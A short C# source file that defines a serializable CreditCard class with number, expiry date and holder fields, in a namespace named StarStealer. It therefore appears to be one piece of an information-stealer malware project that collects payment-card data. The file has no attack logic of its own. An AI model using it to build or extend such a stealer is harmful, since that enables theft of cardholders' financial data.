using System.Runtime.Serialization;

namespace StarStealer.Models
{
    [DataContract]
    class CreditCard
    {
        [DataMember]
        public string Number { get; set; }
        [DataMember]
        public string ValidDate { get; set; }
        [DataMember]
        public string Holder { get; set; }
    }
}
